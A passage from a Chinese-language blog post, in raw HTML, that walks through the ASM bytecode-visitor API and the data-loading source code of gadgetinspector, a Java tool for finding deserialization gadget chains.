class="keyword">var</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类型指令</span></span><br><span class="line"><span class="comment"> * 类型指令是以类的内部名称作为参数的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：NEW、ANEWARRAY、CHECKCAST、INSTANCEOF</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>type要访问的指令的操作数（对象或数组类的内部名称）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTypeInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String type)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问字段指令</span></span><br><span class="line"><span class="comment"> * 字段指令是加载或存储对象字段值的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：GETSTATIC、PUTSTATIC、GETFIELD、PUTFIELD</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>owner字段所有者类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name字段的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor字段的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问方法指令</span></span><br><span class="line"><span class="comment"> * 方法指令是调用方法的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：INVOKEVIRTUAL、INVOKESPECIAL、INVOKESTATIC、INVOKEINTERFACE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>owner方法所有者类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name方法的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor方法的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>isInterface方法的所有者类是否为接口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor, <span class="type">boolean</span> isInterface)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 invokedynamic 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name方法的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor方法的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>bootstrapMethodHandle引导方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>bootstrapMethodArguments引导方法的常量参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInvokeDynamicInsn</span><span class="params">(java.lang.String name, java.lang.String descriptor, Handle bootstrapMethodHandle, java.lang.Object... bootstrapMethodArguments)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问跳转指令</span></span><br><span class="line"><span class="comment"> * 跳转指令是可以跳转到另一条指令的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：IFEQ、IFNE、IFLT、IFGE、IFGT、IFLE、IF_ICMPEQ、IF_ICMPNE、IF_ICMPLT、IF_ICMPGE、IF_ICMPGT、IF_ICMPLE、IF_ACMPEQ、IF_ACMPNE、GOTO、JSR、IFNULL、IFNONNULL</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>label要访问的指令的操作数（标签，指定跳转指令可以跳转到的指令）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitJumpInsn</span><span class="params">(<span class="type">int</span> opcode, Label label)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问标签</span></span><br><span class="line"><span class="comment"> * 标签指定紧随其后的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>label标签对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLabel</span><span class="params">(Label label)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 LDC 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>value要加载到堆栈上的常数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(java.lang.Object value)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 IINC 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>value要递增的局部变量的索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>increment递增的数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitIincInsn</span><span class="params">(<span class="type">int</span> <span class="keyword">var</span>, <span class="type">int</span> increment)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 TABLESWITCH 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>min最小键值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>max最大键值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>dflt默认处理程序块的开始部分</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labels处理程序块的开始</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTableSwitchInsn</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max, Label dflt, Label... labels)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 LOOKUPSWITCH 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>dflt默认处理程序块的开始部分</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>keys键值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labels处理程序块的开始</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLookupSwitchInsn</span><span class="params">(Label dflt, <span class="type">int</span>[] keys, Label[] labels)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 MULTIANEWARRAY 指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor数组类型的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>numDimensions要分配的数组的维数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMultiANewArrayInsn</span><span class="params">(java.lang.String descriptor, <span class="type">int</span> numDimensions)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问指令上的注释</span></span><br><span class="line"><span class="comment"> * 必须在带注释的指令之后调用此方法，对同一指令可以多次调用</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeRef对注释类型的引用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typePathtypeRef 中带注释的类型参数/通配符绑定/数组元素类型/静态内部类型的路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor注释类的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>visible运行时是否可见</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> AnnotationVisitor <span class="title function_">visitInsnAnnotation</span><span class="params">(<span class="type">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="type">boolean</span> visible)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问 try catch 块</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>start异常处理程序范围的开始（包含）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>end异常处理程序范围的结束（不包含）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>handler异常处理程序代码的开头</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>type由处理程序处理的异常类型的内部名称，或 null 来捕获任何异常（对 finally 块）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTryCatchBlock</span><span class="params">(Label start, Label end, Label handler, java.lang.String type)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问异常处理程序类型上的注释</span></span><br><span class="line"><span class="comment"> * 必须在 visitTryCatchBlock 之后调用，对同一个异常处理程序可以多次调用</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeRef对注释类型的引用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typePathtypeRef 中带注释的类型参数/通配符绑定/数组元素类型/静态内部类型的路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor注释类的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>visible运行时是否可见</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> AnnotationVisitor <span class="title function_">visitTryCatchAnnotation</span><span class="params">(<span class="type">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="type">boolean</span> visible)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问方法的最大堆栈大小和最大局部变量数量</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>maxStack方法的最大堆栈大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>maxLocals方法的最大局部变量数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMaxs</span><span class="params">(<span class="type">int</span> maxStack, <span class="type">int</span> maxLocals)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问方法的末尾</span></span><br><span class="line"><span class="comment"> * 该方法是最后一个被调用的方法，用于通知访问者该方法的所有注释和属性已经被访问</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span></span><br></pre></td></tr></table></figure><h4 id="3-FieldVisitor"><a href="#3-FieldVisitor" class="headerlink" title="3. FieldVisitor"></a>3. FieldVisitor</h4><p>方法调用顺序（访问顺序）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( visitAnnotation | visitTypeAnnotation | visitAttribute )* visitEnd</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>JSRInlinerAdapter 用于简化代码分析，删除 JSR 指令并内联引用的子例程（没懂）</p><blockquote><p>A MethodVisitor that removes JSR instructions and inlines the referenced subroutines</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>methodVisitor   将生成的内联方法代码发送到的方法访问者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access    方法的访问标志（Opcodes）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    方法的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor      方法的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature    方法的签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptions      方法异常类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> JSRInlinerAdapter​(MethodVisitor methodVisitor,</span><br><span class="line">                         <span class="type">int</span> access,</span><br><span class="line">                         java.lang.String name,</span><br><span class="line">                         java.lang.String descriptor,</span><br><span class="line">                         java.lang.String signature,</span><br><span class="line">                         java.lang.String[] exceptions)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x02-项目结构"><a href="#0x02-项目结构" class="headerlink" title="0x02 项目结构"></a>0x02 项目结构</h1><p>项目中包含三种检测实现，在以下三个目录下：javaserial 针对 Java 原生序列化，jackson 针对 Jackson（JSON 库），xstream 针对 XStream（XML 库），同时在 config 目录下实现了各自的配置接口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── config      <span class="comment"># 配置接口和具体实现</span></span><br><span class="line">│   ├── ConfigRepository.java</span><br><span class="line">│   ├── GIConfig.java</span><br><span class="line">│   ├── JacksonDeserializationConfig.java</span><br><span class="line">│   ├── JavaDeserializationConfig.java</span><br><span class="line">│   └── XstreamDeserializationConfig.java</span><br><span class="line">├── data        <span class="comment"># 数据的存储格式以及读取方法</span></span><br><span class="line">│   ├── ClassReference.java</span><br><span class="line">│   ├── DataFactory.java</span><br><span class="line">│   ├── DataLoader.java</span><br><span class="line">│   ├── GraphCall.java</span><br><span class="line">│   ├── InheritanceDeriver.java</span><br><span class="line">│   ├── InheritanceMap.java</span><br><span class="line">│   ├── MethodReference.java</span><br><span class="line">│   └── Source.java</span><br><span class="line">├── jackson     <span class="comment"># JSON 库</span></span><br><span class="line">│   ├── JacksonImplementationFinder.java</span><br><span class="line">│   ├── JacksonSerializableDecider.java</span><br><span class="line">│   └── JacksonSourceDiscovery.java</span><br><span class="line">├── javaserial  <span class="comment"># 原生序列化</span></span><br><span class="line">│   ├── SimpleImplementationFinder.java</span><br><span class="line">│   ├── SimpleSerializableDecider.java</span><br><span class="line">│   └── SimpleSourceDiscovery.java</span><br><span class="line">├── xstream     <span class="comment"># XML 库</span></span><br><span class="line">│   ├── CustomXstreamSerializableDecider.java</span><br><span class="line">│   └── XstreamSerializableDecider.java</span><br><span class="line">├── CallGraphDiscovery.java             <span class="comment"># 方法调用链中的污点参数传递关系</span></span><br><span class="line">├── ClassResourceEnumerator.java        <span class="comment"># 类枚举器</span></span><br><span class="line">├── GadgetChainDiscovery.java           <span class="comment"># 搜索利用链</span></span><br><span class="line">├── GadgetInspector.java                <span class="comment"># 主类，程序入口</span></span><br><span class="line">├── ImplementationFinder.java           <span class="comment"># 接口，获取目标方法的子类实现</span></span><br><span class="line">├── MethodDiscovery.java                <span class="comment"># 类信息、方法信息、继承信息</span></span><br><span class="line">├── PassthroughDiscovery.java           <span class="comment"># 方法的返回值与参数的关系</span></span><br><span class="line">├── SerializableDecider.java            <span class="comment"># 序列化决策者接口</span></span><br><span class="line">├── SourceDiscovery.java                <span class="comment"># 污点源信息</span></span><br><span class="line">├── TaintTrackingMethodVisitor.java     <span class="comment"># 方法访问者</span></span><br><span class="line">└── Util.java                           <span class="comment"># 工具函数</span></span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-x2F-data"><a href="#gadgetinspector-x2F-data" class="headerlink" title="gadgetinspector&#x2F;data"></a>gadgetinspector&#x2F;data</h2><p>主要是数据格式的定义。</p><h3 id="1-DataLoader"><a href="#1-DataLoader" class="headerlink" title="1. DataLoader"></a>1. DataLoader</h3><p>定义了数据的读写方式，根据数据工厂方法（DataFactory）进行读写，<code>loadData</code> 返回的是动态数组，源码中多处调用进行数据遍历。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据数据工厂接口解析数据到对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  工厂方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; List&lt;T&gt; <span class="title function_">loadData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; lines = Files.readLines(filePath.toFile(), StandardCharsets.UTF_8);</span><br><span class="line">    <span class="keyword">final</span> List&lt;T&gt; values = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;T&gt;(lines.size());</span><br><span class="line">    <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">        values.add(factory.parse(line.split(<span class="string">&quot;\t&quot;</span>, -<span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据数据工厂接口将数据写入文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  工厂方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> values   待写入的数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">saveData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory, Collection&lt;T&gt; values)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newWriter(filePath.toFile(), StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (T value : values) &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] fields = factory.serialize(value);</span><br><span class="line">            <span class="keyword">if</span> (fields == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (String field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>).append(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writer.write(sb.substring(<span class="number">1</span>));</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后利用上面的方法实现读取类信息（classes.dat）和方法信息（methods.dat），返回存储键值的 Map，源码中多次调用用于搜索。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 classes.dat 加载类信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;ClassReference.Handle, ClassReference&gt; loadClasses() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : loadData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Factory())) &#123;</span><br><span class="line">            classMap.put(classReference.getHandle(), classReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 methods.dat 加载方法信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, MethodReference&gt; loadMethods() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference methodReference : loadData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Factory())) &#123;</span><br><span class="line">            methodMap.put(methodReference.getHandle(), methodReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> methodMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DataFactory"><a href="#2-DataFactory" class="headerlink" title="2. DataFactory"></a>2. DataFactory</h3><p>数据工厂接口，定义数据的存储格式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DataFactory</span>&lt;T&gt; &#123;</span><br><span class="line">    T <span class="title function_">parse</span><span class="params">(String[] fields)</span>;</span><br><span class="line">    String[] serialize(T obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ClassReference"><a href="#3-ClassReference" class="headerlink" title="3. ClassReference"></a>3. ClassReference</h3><p>定义<strong>类信息</strong>的描述方式，这些信息具体都使用 asm 访问者记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 